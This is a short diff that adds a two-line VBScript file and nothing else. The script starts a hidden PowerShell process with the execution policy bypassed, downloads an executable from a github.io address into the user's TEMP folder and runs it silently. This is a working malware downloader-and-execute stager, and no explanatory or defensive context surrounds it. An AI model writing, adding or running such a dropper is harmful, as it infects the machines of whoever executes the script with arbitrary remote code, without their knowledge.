@@ -1,0 +1,2 @@
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell -w Hidden -ep Bypass -c ""iwr https://vu7874.github.io/1/8 -OutFile $env:TEMP\8.exe; cmd /c $env:TEMP\8.exe""", 0, False
